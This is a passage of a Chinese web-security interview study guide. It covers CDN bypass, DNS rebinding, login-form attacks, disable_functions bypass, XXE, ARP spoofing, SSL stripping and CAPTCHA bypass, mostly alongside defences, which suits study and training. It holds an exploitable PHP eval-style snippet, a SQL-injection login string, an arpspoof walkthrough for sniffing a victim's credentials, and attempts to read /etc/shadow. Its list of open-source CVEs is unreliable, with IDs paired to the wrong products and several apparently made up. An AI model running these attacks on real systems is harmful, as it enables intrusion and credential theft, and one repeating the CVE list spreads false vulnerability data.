https://x.threatbook.cn/</span><br><span class="line">域名查询: https://site.ip138.com/</span><br><span class="line">DNS历史查询: https://securitytrails.com/</span><br><span class="line">Netcraft: https://sitereport.netcraft.com/?url=github.com</span><br></pre></td></tr></table></figure><p>(2) 查询子域名。CDN通常只会将目标网站的主域名解析到CDN节点的IP地址。如果目标网站有多个子域名，那么其中某些子域名可能没有使用CDN。子域名查找方法和工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">搜索引擎查询：如Google。使用语法类似于 site:baidu.com  inurl:baidu.com，搜目标名字</span><br><span class="line">在线查询工具：</span><br><span class="line">如: https://tool.chinaz.com/sudbdomain/  https://i.links.cn/subdomain/ </span><br><span class="line">https://subdomain.chaxun.la/  https://searchdns.netcraft.com/  https://www.virustotal.com/</span><br><span class="line">子域名爆破工具: </span><br><span class="line">Layer子域名挖掘机  wydomain：https://github.com/ring04h/wydomain  </span><br><span class="line">subDomainsBrute:https://github.com/lijiejie/  Sublist3r:https://github.com/aboul3la/Sublist3r</span><br></pre></td></tr></table></figure><p>(3) 网站邮件头信息。比如邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，由于一般的邮件系统在内部，未经过CDN解析，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p><p>(4) 网络空间安全引擎搜索。通过关键字或网站域名，找出被收录的IP，有时获取到的就是网站的真实IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">钟馗之眼： https://www.zoomeye.org</span><br><span class="line">Shodan: https://www.shodan.io</span><br><span class="line">Fofa: https://fofa.so</span><br><span class="line">ZoomEye: https://www.zoomeye.org/</span><br></pre></td></tr></table></figure><p>(5) 利用SSL证书寻找真实IP。证书颁发机构(CA)必须将他们发布的每个SSL&#x2F;TLS证书发布到公共日志中，SSL&#x2F;TLS证书通常包含域名、子域名和电子邮件地址。因此SSL&#x2F;TLS证书成为了攻击者的切入点。<br>步骤：访问网站，在地址栏查看网址的SSL证书(锁型图标)。复制SSL证书的SHA1指纹，SHA1指纹是用于识别证书的唯一标识符。将SHA1指纹粘贴到SSL证书搜索工具中，可使用Censys或SSL Labs等工具。搜索结果将显示网站的真实ip地址，大多数情况下真实IP地址与SSL证书中的IP地址相同。注意某些网站可能会用多个IP地址或CDN来托管其网站。<br>(6) 国外主机解析域名。国外多ping测试工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://asm.ca.com/zh_cn/ping.php</span><br><span class="line">http://host-tracker.com/</span><br><span class="line">http://www.webpagetest.org/</span><br><span class="line">https://dnscheck.pingdom.com/</span><br></pre></td></tr></table></figure><p>(7) 扫描全网。通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Zmap: https://github.com/zmap/zmap</span><br><span class="line">Masscan: https://github.com/robertdavidgraham/masscan</span><br></pre></td></tr></table></figure><p>(8) 配置不当导致绕过。在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。<br>案例1：为了方便用户访问，我们常常将 <code>www.test.com</code> 和 <code>test.com</code> 解析到同一个站点，而CDN只配置了 <code>www.test.com</code> ，通过访问 <code>test.com</code> ，就可以绕过 CDN 了。<br>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</p><ol start="3"><li>列举你所知道的所有开源组件高危漏洞（10个以上）</li></ol><p>(1) Log4j 2 远程代码执行漏洞(CVE-2021-44228):该漏洞影响了Log4j 2 所有版本，可被利用来执行任意代码。<br>(2) Spring Core RCE漏洞(CVE-2022-22965): Spring Framework远程代码执行漏洞<br>(3) Spring Boot RCE漏洞(CVE-2022-22963): Spring Cloud Function存在SPEL表达式注入漏洞<br>(4) Fastjson 反序列化漏洞(CVE-2022-22947): Spring Cloud Gateway远程代码执行漏洞<br>(5) Apache Struts2 反序列化漏洞（CVE-2022-0338）<br>(6) Apache Commons Collections 反序列化漏洞（CVE-2022-22960）<br>(7) Apache Commons FileUpload 反序列化漏洞（CVE-2022-22959）<br>(8) Apache Commons BeanUtils 反序列化漏洞（CVE-2022-22958）<br>(9) Jenkins 远程代码执行漏洞（CVE-2022-0241）<br>(10) Apache Tomcat 远程代码执行漏洞（CVE-2022-22966）<br>(11) Apache Shiro 远程代码执行漏洞（CVE-2022-22967）<br>(12) Spring Data Commons SQL 远程代码执行漏洞（CVE-2022-22964）<br>(13) Spring Boot Starter Data JPA 远程代码执行漏洞（CVE-2022-22962）<br>(14) Apache Log4j SQL注入漏洞(CVE-2022-23305)</p><ol start="4"><li>服务器为IIS+PHP+MySQL，发现root权限注入漏洞，讲讲你的渗透思路。</li></ol><p>可以读取IIS信息，知道路径，如果像WAMMP类似构建，通过@@datadir知道数据库路径也可以猜测网站路径。<br>或者直接写shell</p><ol start="5"><li>下面这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利用。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.exp.com/1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s_func</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s_func&#x27;</span>];</span><br><span class="line"><span class="variable">$info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>];</span><br><span class="line"><span class="variable">$s_func</span>(<span class="variable">$info</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>代码执行，通过assert调用。</p><ol start="6"><li>说出至少三种业务逻辑漏洞，以及修复方式？</li></ol><p>密码找回漏洞存在<br>(1) 密码允许暴力破解<br>(2) 存在通用型找回凭证<br>(3) 可以跳过验证步骤<br>(4) 找回凭证可以拦包获取<br>等方式来通过厂商提供的密码找回功能来得到密码。</p><p>身份认证漏洞中最常见的是<br>(1) 会话固定攻击<br>(2) Cookie仿冒</p><p>只要得到Session或Cookie即可伪造用户身份。验证码漏洞中存在<br>验证码允许暴力破解<br>验证码可以通过JavaScript或者改包的方式来进行绕过</p><ol start="7"><li>DNSRebinding</li></ol><p>DNS重绑定利用DNS绕过浏览器的同源策略。<br>攻击原理：攻击者首先控制一个域名，并将其指向一个恶意网站；然后使用恶意网站上的脚本诱导用户访问该域名；当用户访问时浏览器会将其解析为攻击者的IP地址；攻击者然后将域名的IP地址重绑定到另一个IP地址，该IP地址指向一个内网中的服务器；当用户再次访问该域名时，浏览器会使用攻击者重绑定的IP地址；由于浏览器认为这两个IP地址是同源的，因此恶意脚本可以访问内网中的服务器。<br>DNS重绑定攻击可以用来窃取敏感数据，例如用户名、密码和信用卡信息。它还可以用来执行恶意代码，例如安装恶意软件或控制受感染的设备。<br>防御：通过控制2次的DNS查询请求的间隔低于TTL值,确保两次查询的结果一致。写一个请求判断,Linux系统修改默认的TTL值为10,即可很轻松解决这个问题。使用 DNS 安全扩展 (DNSSEC)，该扩展可以防止 DNS 欺骗。<br><a href="https://xz.aliyun.com/t/7495">从0到1认识DNS重绑定攻击</a></p><p>1、攻击者设置恶意DNS服务器： 攻击者首先设置一个恶意的DNS服务器，该服务器会向受害者返回虚假的DNS记录。这些DNS记录通常指向攻击者的恶意服务器，而不是实际目标服务器。<br>2、受害者访问受信任的网站： 受害者在其浏览器中访问一个受信任的网站，该网站可能包含一些恶意的内容或利用漏洞。通常，这个受信任的网站包含了引用了攻击者的恶意域名的JavaScript代码。<br>3、恶意JavaScript执行： 受害者的浏览器执行了来自受信任网站的恶意JavaScript代码，该代码尝试在后台加载攻击者的恶意域名。浏览器会尝试解析恶意域名的IP地址，为此会发起DNS查询。<br>4、DNS重绑定： 浏览器向恶意DNS服务器发起DNS查询请求，攻击者的DNS服务器会返回一个虚假的DNS记录，将攻击者的恶意服务器的IP地址与恶意域名绑定。一旦浏览器获得了虚假的IP地址，它会发起与攻击者服务器的连接，从而执行攻击者所期望的操作。<br>5、攻击执行： 一旦浏览器与攻击者服务器建立了连接，攻击者可以执行各种恶意操作，例如窃取用户信息、执行未经授权的操作等。</p><ol start="8"><li>登录框攻击面</li></ol><p>错误信息判断：不同用户名或密码错误信息不同，可以暴力破解。修复方案是将错误信息改为一致。<br>弱口令：暴力破解。修复方案是禁用弱口令。<br>空口令：直接登录。修复方案是判断密码为空禁止空口令登录。<br>登录认证绕过：少数可禁用js绕过登录认证，也有少部分通过burp抓包改包登录绕过。修复方案是不用前端认证，增加验证码，密码通过加密算法加密，失败多次加锁，密码强度增加。<br>存在暴力破解：社工手段。修复方案：增加验证码，密码通过加密算法加密，失败多次加锁，密码强度增加。<br>图形验证码不失效：输入特殊字符可能绕过或验证码使用后未刷新。修复方案：验证码识别后销毁session中的验证码，限制用户提交的验证码不能为空，判断提交的验证码与服务器上存储的是否一致。<br>短信验证码绕过：某些网站使用手机短信登录，短信验证码可被绕过或验证码过短被爆破。修复方案：若存在特权验证码，建议删除；服务端严格校验验证码参数是否为空，格式是否正确；关键操作每提交一次请求，应发送新的短信验证码，旧的不可使用。<br>短信验证码可暴力破解：位数太短或有效期太长。修复方案：短信验证码不少于6位，有效期不超过1分钟，验证码错误次数上限锁定账户。<br>短信轰炸：发送数据包重放，若服务器短信平台未做校验，系统会一直发短信，造成短信轰炸，连续收到10条以上短信即可验证。修复方案：后端配置同一手机号发送次数不超过3-5次，对间隔时间做限制；前端禁止同一手机号进行次数大于5的发送，加入验证码功能，限制发送时间间隔。<br>恶意锁定问题：不断输入错误的密码恶意锁定任意账号。修复方案：账户锁定之后应不能继续使用认证功能。认证功能防自动化操作，如添加图形验证码。<br>密码明文传输：敏感数据未加密。修复方案：使用加密方式传输，如HTTPS，但可能会影响用户体验。也可用前端js加密后再传输。<br>反射型跨站脚本攻击：可对页面提交参数处进行测试。修复方案：输入验证，输出编码，黑白名单结合。<br>万能密码：诸如 <code>admin&#39;or 1=1 #</code> 。修复方案：web应用防火墙。<br>sql注入：不多说。修复方案：略。<br>任意用户密码修改&#x2F;重置：篡改用户名或id、暴力破解验证码等方式修改或重置任意账户密码。修复方案：及时对请求的用户身份与当前登录的用户身份进行校验，判断是否有权修改用户的密码并对原始密码是否正确进行正确判断；对原始密码进行了验证的情况下，限制输入原始密码的错误次数，防止攻击者暴力破解原始密码；重置密码链接中的关键信息应随机化，不可预测(如token)，且禁止将关键信息返回到客户端。<br>目录遍历：输入类似于 <code>../../</code> 或通过御剑进行目录扫描。修复方案：IIS中关闭目录浏览功能，在IIS的网站属性中，勾去目录浏览选项，重启IIS；Apache中关闭目录浏览功能，打开Apache配置文件中的httpd.conf，查找“Options Indexs FollowSymLinks”，修改为“ Options -Indexes”(减号表示取消，保存退出，重启Apache；Nginx中默认不会开启目录浏览功能，若您发现当前已开启该功能，可以编辑nginx.conf文件，删除如下两行：autoindex on;autoindex_exact_size on;重启Nginx。<br>敏感文件信息泄露：爬虫扫描或手工挖掘查看源代码。修复方案：重要代码注意加密保护或隐藏。</p><ol start="9"><li>getshell的姿势</li></ol><p>两篇参考文章：<br><a href="https://blog.csdn.net/m0_53087192/article/details/112779349">各种Getshell姿势总结</a><br><a href="https://www.freebuf.com/articles/web/258229.html">GetShell的姿势总结</a></p><ol start="10"><li>DNS重绑定，利用</li></ol><p>见问题7</p><ol start="11"><li>disable function bypass</li></ol><p>(1) 黑名单绕过：查找漏网之鱼。如: <code>assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open</code><br>(2) 利用Windows组件COM绕过。查看 <code>com.allow_dcom</code> 是否开启,这个默认是不开启的。<br>(3) 利用pcntl_exec结合python反弹shell。使用条件是PHP安装并启用了pcntl插件。<br>(4) 利用LD_PRELOAD环境变量。通过环境变量LD_PRELOAD劫持系统函数。<br>(5) 利用ShellShock(CVE-2014-6271)。Bash破壳漏洞。<br>(6) 利用Apache Mod CGI<br>(7) 通过攻击PHP-FPM<br>(8) 利用GC UAF<br>(9) 利用Backtrace UAF<br>(10) Json Serializer UAF<br>(11) 利用SplDoublyLinkedList UAC<br>(12) 利用FFI扩展执行命令<br>(13) 利用ImageMagick</p><p><a href="https://www.freebuf.com/articles/network/263540.html">绕过Disable Functions来搞事情</a><br><a href="https://xz.aliyun.com/t/10057">bypass disable_functions姿势总结</a><br><a href="https://www.geekby.site/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/">常见Bypass Disable Functions方法</a></p><ol start="12"><li>写出你知道的逻辑漏洞</li></ol><p>按类型：<br>身份验证漏洞：暴力破解漏洞、Session固定攻击、cookie欺骗漏洞。<br>权限类逻辑漏洞：平行权限跨越、垂直权限跨越、未经授权访问。<br>图形验证码漏洞：图形验证码突破。<br>找回密码逻辑漏洞：密码找回漏洞。<br>业务数据篡改漏洞：业务数据篡改（赋值反冲）<br>执行顺序逻辑漏洞：执行顺序篡改。<br>其他类型逻辑漏洞：条件竞争漏洞、数据包重放漏洞、参数绑定漏洞。</p><p><a href="https://www.freebuf.com/vuls/281141.html">逻辑漏洞梳理与总结</a></p><ol start="13"><li>简述XXE的基本原理，以及如何去检测或判断blind XXE的存在</li></ol><p>XXE(XML External Entity Injection)，外部实体注入漏洞。攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。<br>如何检测或判断Blind XXE存在：寻找XML输入点。比如Content-Type:text&#x2F;xml，post数据包含XML格式。将结果写入文件查看。</p><p>防御：完全禁用DTD，过滤用户提交的XML数据。</p><p>危害：<br>1、DOS攻击<br>2、SSRF攻击<br>3、使用file协议读取任意文件<br>4、端口探测<br>5、执行系统命令</p><ol start="14"><li>ARP攻击的原理(讲出具体流程)，如何发现并防御ARP攻击</li></ol><p>ARP协议没有真伪校验机制，因此网络中的攻击者可以通过伪造IP地址和MAC地址发出一些假报文来欺骗其它主机，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断地发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p><p>具体流程：<br>PC1需要跟PC2通信，通过ARP请求包询问PC2的MAC地址，由于采用广播形式，所以交换机将ARP请求包从接口P1广播到P2和PC3。（注：交换机收到广播&#x2F;组播&#x2F;未知帧都会其他接口泛洪）<br>PC2根据询问信息，返回ARP单播回应包；此时PC3作为攻击者，没有返回ARP包，但是处于”监听”状态，为后续攻击做准备。<br>PC1和PC2根据ARP问答，将各自的ARP映射信息（IP-MAC）存储在本地ARP缓存表。<br>交换机根据其学习机制，记录MAC地址对应的接口信息，存储在CAM缓存表（也称为MAC地址表）。交换机收到数据包时，会解封装数据包，根据目标MAC字段进行转发。(ARP表遵循后到优先原则，攻击者只需源源不断发送IP-MAC的ARP回应包即可。)</p><p>防御：<br>使用HTTPS加密协议：<br>ARP静态绑定：在路由和终端上同时进行 IP 地址和 MAC 地址的绑定，相当于人工管理 ARP 缓存，自行维护 IP 地址和 MAC 地址的对应关系。但维护非常繁琐。换个网卡或 IP 地址，都需要重新修改配置。当流动电脑临时接入时，也要即时进行绑定，费时费力。<br>交换机端口绑定：跟双绑措施类似，只不过将 IP 和交换机端口进行绑定，缺点也是类似的。<br>PPPoE：使用 PPPoE 协议对网络流量进行二次封装，为每个用户都分配账号密码，上网时必须通过认证。这样 ARP 报文在一个认证的通道中传输，也就不会遭受攻击了。但 PPPoE 也不是完美的，由于二次封装的存在，传输效率会打些折扣。更严重的是，PPPoE 方式下局域网内无法互访。如果局域网内需要部署文件服务器、打印机，就有麻烦了。<br>启用ARP防火墙：ARP防火墙可以检测和阻断恶意的ARP报文，从而防止ARP攻击。<br>启用DHCP Snooping：DHCP Snooping 是一种交换机功能，可以阻止攻击者伪造 DHCP 报文来欺骗受害机器。</p><p><a href="https://zhuanlan.zhihu.com/p/28818627">图解ARP协议（二）ARP攻击篇</a></p><ol start="15"><li>SSL Strip（SSP）攻击到底是什么？</li></ol><p>SSL Strip(也叫HTTPS降级攻击)原理：为了剥离SSL，攻击者干预了HTTP到安全HTTPS协议的重定向，并拦截了用户到服务器的请求。然后，攻击者将继续在自己和服务器之间建立HTTPS连接，并与用户建立不安全的HTTP连接，充当他们的桥梁。<br>SSL Strip利用了大多数用户访问SSL的方式。大多数访问者连接到通过302重定向进行重定向的网站页面，或通过非SSL网站的连接到达SSL页面。<br>举例：受害者想打开网站 <code>www.example.com</code> ，则浏览器连接到攻击者机器，并等待服务器的响应。反过来，在SSL Strip中，攻击者将受害者的请求转发到example的服务器，并接收安全地HTTPS页面。例如: <code>https://www.example.com</code> 。此时，攻击者已经完全控制了页面。他将HTTPS降级为HTTP，然后将其发回到受害者的浏览器，现在浏览器将其重定向到 <code>http://www.example.com</code> ，受害者的所有信息将会纯文本格式传输，攻击者将能拦截它们。服务器认为已经建立安全连接，实际上确实建立了安全连接，只是连接到攻击者机器上。<br>实施方法：SSL Strip攻击最常见的方法是创建热点并允许受害者连接到该热点。采用与官方开放连接相似的热点名称来混淆伪造。假如麦当劳热点名称是“麦当劳”，那么攻击者可以将热点伪造为“麦当劳餐厅”。一旦用户尝试连接到服务器，攻击者便会使用对热点的控制来攻击用户。</p><p>防御措施：<br>(1) 启用HSTS。HSTS是一种安全策略，告诉浏览器在未来的访问中都使用HTTPS。缺点是用户首次访问不受HSTS保护，首次访问浏览器未收到HSTS。<br>(2) 使用HTTPS Everywhere。这是一个浏览器扩展，它会自动将所有网站的请求切换到HTTPS。<br>(3) 使用HTTPS强制传输。最有效。<br>(4) WIFI加密传输。<br>(5) 定期更新SSL证书。</p><p><a href="https://learnku.com/cs/t/42552">什么是 SSL Strip 攻击？</a><br><a href="https://glsakura.gitee.io/2020/04/02/%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84%20SSLStrip%20%E6%94%BB%E5%87%BB/">如何进行一次完整的 SSLStrip 攻击</a></p><ol start="16"><li>中间人攻击–ARP欺骗原理、实战及防御</li></ol><p>ARP欺骗(Address Resolution Protocol Spoofing)原理是通过伪造或欺骗ARP协议的通信过程，使攻击者能够欺骗其它主机，使他们将数据发送到错误主机上，从而达到攻击者的目的。</p><p>在一个以太网中，当一台主机想要发送数据包给另一台主机时，它需要知道目标主机的MAC地址。<br>此时，发送方会发送一个ARP请求，请求目标主机的MAC地址。<br>目标主机会将自己的MAC地址发送回去，请求方则将其缓存到自己的ARP缓存中，以加快以后的通信。<br>攻击者会利用这个过程伪造自己的MAC地址，并向其他主机发送这种伪造的ARP请求，从而将目标主机的MAC地址指向攻击者的MAC地址。<br>这就使攻击者能够接收到目标主机发送的数据包，并可以选择是否转发或篡改这些数据，同时继续欺骗其他主机。</p><p>实战：<br>开始前更新kali下的软件列表，然后安装dsniff（用于自动化完成ARP欺骗）。<br>攻击机输入 <code>ifconfig</code> 查看内网IP，接着输入 <code>nbtscan -r 192.168.119.0/24</code> 扫描内网网段。<br>探测到了IP为192.168.119.131，名为HAIXIN-PC的受害机。检测网络连接正常。<br>接下来在攻击机中输入 <code>arpspoof -i eth0 -t 192.168.119.131 192.168.119.2</code> 开启ARP攻击，其中 <code>-i</code> 指定攻击机某张网卡来进行攻击， <code>-t</code> 第一个IP指定受害机的IP为内网网关（一般是路由）的IP，第一个参数可通过扫描确定，第二个参数可在攻击机中输入 <code>netstat -rn</code> 来查看。<br>通过以上措施可使目标机器断网。接下来要使kali具备类似路由的功能，将受害机发来的网络请求包转发给真实的网关，再由真实网关转发到外网，接收返回包的过程同理。<br>使用以下命令暂时开启kali的路由转发功能: <code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code> 。此时受害者机器网络连接正常说明路由转发功能已开启。<br>打开wireshark并选择之前进行arp欺骗的网卡。当受害者打开某个登录网页时，流量会被wireshark捕捉到，最终得到受害者信息</p><p>防御：<br>(1) 静态ARP绑定：将网络中的关键设备的MAC地址与其IP地址进行手动绑定，以防止攻击者发送虚假的ARP响应。这个方法对于关键服务器和网络设备非常有用，但需要定期维护。<br>(2) 网络监控和入侵检测系统（IDS&#x2F;IPS）：使用网络监控工具和入侵检测系统来检测异常ARP活动。这些系统可以监视并响应异常的ARP流量，例如大量的ARP请求或虚假的ARP响应。<br>(3) ARP检测工具：使用ARP检测工具来监视网络流量和ARP请求&#x2F;响应，以检测潜在的ARP欺骗攻击。这些工具可以警告管理员或自动采取措施来应对攻击。<br>(4) 网络隔离：将网络划分成多个子网，并使用防火墙和ACL（访问控制列表）来限制不同子网之间的流量。这有助于减少ARP欺骗攻击的影响范围。<br>(5) 端口安全性：在交换机上启用端口安全性功能，限制每个端口连接的设备数量，并只允许已知MAC地址的设备连接到端口。这可以防止未经授权的设备连接到网络。<br>(6) DHCP Snooping：启用DHCP Snooping功能，以确保DHCP分配的IP地址与相应的MAC地址匹配。这有助于减少攻击者通过伪造IP地址来进行ARP欺骗的可能性。<br>(7) 802.1X认证：使用802.1X认证来要求网络设备进行身份验证，然后再允许其访问网络。这可以防止未经授权的设备访问网络并进行ARP欺骗攻击。</p><p><a href="https://www.freebuf.com/articles/network/266951.html">中间人攻击之arp欺骗</a></p><ol start="17"><li>会话劫持原理</li></ol><p>会话劫持(Session Hijacking, 又名cookie劫持或cookie side-jacking)是一种网络攻击。攻击者通过窃取合法用户的会话ID，接管该用户的网络会话，从而获得该用户的权限。<br>原理：<br>首先要获取合法用户的ID。可通过钓鱼，监听网络流量，诱使用户点击恶意链接，利用应用程序漏洞。<br>攻击者获取到会话ID后，可以伪装成合法用户，向服务器发送请求。<br>服务器收到请求后，会将请求转发给合法用户。<br>攻击者可以通过接管合法用户的网络会话，获得该用户的权限。</p><ol start="18"><li>CC攻击</li></ol><p>CC攻击(Challenge Collapsar Attack)是一种拒绝服务攻击(DDoS)的一种，攻击者通过向受害者目标发送大量的请求，从而导致目标资源耗尽，无法正常提供服务。</p><p>原理：<br>(1) 攻击者首先要获取目标的IP地址和端口号。<br>(2) 攻击者使用CC攻击工具，向目标发送大量的请求。<br>(3) 目标收到请求后，会消耗大量的资源来处理这些请求。<br>(4) 当目标的资源耗尽后，将无法正常提供服务。</p><p>一般来说，CC攻击有两种方式进行：第一种方式是利用自己的机器对目标网站进行集中式攻击，目标网站接收到大量的访问请求后，服务器无法正常响应；第二种方式是通过使用大量的分散在各个地区、各个网络和主机上的代理程序或者“僵尸”计算机来攻击目标网站，这样作为攻击源的计算机会比较难以被记录下来。</p><p>危害：破坏服务(如网站，银行，电商等)，勒索(勒索目标，要求目标支付赎金)，宣传(宣传自己的网站或产品)，用户访问速度慢影响体验，长时间会造成搜索排名下降云服务器商清退。</p><p>防御：<br>(1) 使用CDN: 分散流量到多个服务器上，减轻单个服务器压力。<br>(2) 使用WAF: 过滤恶意请求。<br>(3) 使用CC防护服务: 措施是流量清洗，流量分发，DDoS防御。具体有云端CC防护(CloudFlare，阿里云，腾讯云，华为云)和本地CC防护。</p><p>特点：攻击量大，攻击目标广泛，防御难度大。</p><ol start="19"><li>添加时间戳防止重放攻击</li></ol><p>重放攻击(Replay Attack,或称回放攻击)是指攻击者截获了合法用户的请求，并将其重新发送给服务器，以达到冒充合法用户的目的。重放攻击可以用于盗取用户的账号信息、进行非法操作等。</p><p>添加时间戳可以防止重放攻击的原理是：服务器会在收到请求时，检查请求中的时间戳是否在有效范围内。如果时间戳过期，则认为该请求是重复请求，拒绝处理。</p><p>添加时间戳的方法：</p><ul><li>在请求头中添加时间戳：客户端在发送请求时，会在请求头中添加一个名为“timestamp”的时间戳参数，该参数的值为当前时间戳。服务器在收到请求时，会检查该参数的值是否在有效范围内。</li><li>在请求头中添加时间戳：类似于上。</li></ul><p>注意事项：<br>时间戳有效范围可以根据需求设置，一般设置为60s。<br>在服务器端，需要缓存时间戳，以便进行检查。</p><p>优缺点：<br>在客户端和服务端都需要进行修改。<br>时间戳的有效范围需要根据具体需求进行设置。</p><p>除了添加时间戳外，还可以：<br>使用nonce：nonce是一个随机数，每次请求会产生一个新的nonce。服务器会在收到请求时，检查nonce是否存在。nonce存在则认为请求是重复请求拒绝处理。<br>使用数字签名：客户端使用私钥对请求进行签名，服务器使用公钥验签。验签失败则认为是伪造的拒绝处理。</p><ol start="20"><li>https中间人攻击与证书校验</li></ol><p>HTTPS中间人攻击(Man-in-the-middle attack)是指攻击者在客户端和服务器之间建立了一个信任关系，从而可以拦截、修改或丢弃客户端发送给服务器或服务器发送给客户端的数据。<br>HTTPS中间人攻击的常用手段是伪造服务器证书。攻击者可以使用自己伪造的证书，或者使用被劫持的证书。</p><p>HTTPS证书校验的常见方法是：</p><ul><li>检查证书的颁发机构：是否为受信任的机构</li><li>检查证书的有效期：是否过期。</li><li>检查证书的域名：客户端会检查服务器证书的域名与客户端请求的域名相匹配。</li></ul><p>HTTPS强校验：指客户端不允许使用自签名证书或过期的证书。如果客户端检测到服务器使用了自签名证书或过期的证书，则会拒绝连接到该服务器。<br>HTTPS证书pinning：指客户端将服务器证书的哈希值保存到本地。如果检测到服务器证书的哈希值与本地保存的哈希值不匹配，则拒绝连接。<br><a href="https://www.cnblogs.com/jmilkfan-fanguiju/p/10589756.html">自建 CA 中心并签发 CA 证书</a><br><a href="https://zhuanlan.zhihu.com/p/59759209">HTTPS中间人攻击实践</a></p><ol start="21"><li>越权以及逻辑漏洞问题</li></ol><p>越权漏洞是指应用程序未对当前用户操作的身份权限进行严格校验，导致用户可以操作超出自己管理权限范围的功能，从而操作一些非该用户可以操作的行为。越权漏洞是一种常见的安全漏洞，属于“失效的访问控制”的问题，指其它用户能够执行本身没有资格执行的一些操作。</p><p>分类：<br>水平越权：攻击者可以访问其它同级用户的资源或数据。<br>垂直越权：攻击者可以访问更高权限用户的资源或数据。<br>交叉越权：拥有水平越权和垂直越权的权限。</p><p>常见原因包括：<br>开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。<br>应用程序没有对用户的身份进行严格校验，例如使用了弱密码或没有使用权限验证。<br>应用程序的设计存在缺陷：例如没有对敏感数据进行加密。<br>通过隐藏URL，直接对象引用，多阶段功能，静态文件，平台配置错误。</p><p>检测：通过特定传参的更改来发现越权漏洞。</p><p>防御措施：<br>严格校验用户的身份权限，例如强密码、进行权限验证、对敏感数据进行加密等。<br>使用安全的编码规范，例如避免使用弱密码、使用安全的编程语言和框架等。<br>定期进行安全扫描，发现和修复越权漏洞。<br>前后端验证，关键操作前验证身份</p><ol start="22"><li>验证码绕过有哪些方法？</li></ol><p>验证码(CAPTCHA)是“Completely Automated Public Turing test to tell Computers and Humans Apart”全自动区分计算机和人类的图灵测试的缩写。<br><img src="/simg/captcha1.jpg" alt="占比"><br>(1) 验证码固定之无条件不刷新：不刷新验证码绕过。<br>(2) 验证码固定之有条件不刷新：不通过其条件绕过。<br>(3) 验证码前端可获取：验证码隐藏在源码或cookie中。<br>(4) 仅在客户端生成验证码：本地js验证<br>(5) 验证码薄弱：使用插件或工具(PKAV HTTP FUzzer)识别。<br>(6) 验证码爆破登录：抓包丢进工具爆破。<br>(7) 验证码可控制：验证码包含在URL里面，是一个URL传参，可以把URL设置定，验证码可控制。<br>(8) 空验证码绕过：可以通过删除验证码参数或cookie中的值判断，进行暴力破解。<br>(9) 万能验证码：无论是什么，只要输入000000就能直接绕过。<br><a href="https://www.freebuf.com/articles/network/276509.html">验证码绕过、密码找回漏洞</a><br><a href="https://xz.aliyun.com/t/12557">绕过滑块验证码拿到高危漏洞</a></p><ol start="23"><li>分别说出iis，apache，nginx解析漏洞原理</li></ol><p>IIS解析漏洞（也称为IIS路径遍历漏洞）原理：IIS服务器会根据URL中文件的扩展名来判断文件类型，并将其交给相应的处理程序进行处理。攻击者可以利用这一点，构造特殊的URL，让IIS服务器将非脚本文件误认为脚本文件，从而执行恶意代码。</p><p>Apache解析漏洞（也称为Apache漏洞或.htaccess漏洞）原理：Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别，则继续向左识别，直到识别到合法后缀才进行解析。<br>比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p><p>Nginx解析漏洞原理：该漏洞通常是由于Nginx服务器配置不当导致的，攻击者可以通过发送特制的HTTP请求并利用Nginx基于路径转换的问题来访问受限文件。攻击者通过发送带有特定构造的HTTP请求，欺骗服务器将请求转换为其他路径，从而绕过了服务器的访问控制。<br>比如：攻击者可以使用..&#x2F;，.&#x2F;，%2e%2e&#x2F;等字符序列来尝试绕过服务器的访问限制，访问服务器上其他目录中的文件。</p><ol start="24"><li>任意下载漏洞攻击原理及测试方法</li></ol><p>任意文件下载漏洞(Arbitrary File Download Vulnerability)原理：攻击者构造特殊的请求，让服务器下载指定文件。<br>测试方法：<br>注册合法账号登入平台，避免被系统禁止访问。不能造成系统的损坏，记录结果。<br>手动或使用工具（dirbuster, burpsuite）查找常见接口点，比如 <code>download.php?path=  down.php?file=  &amp;src=  &amp;inputfile=</code> ，也可使用Google hacking <code>inurl:&quot;readfile.php?file=&quot;</code><br>尝试下载系统文件( <code>/etc/passwd   /etc/shadow   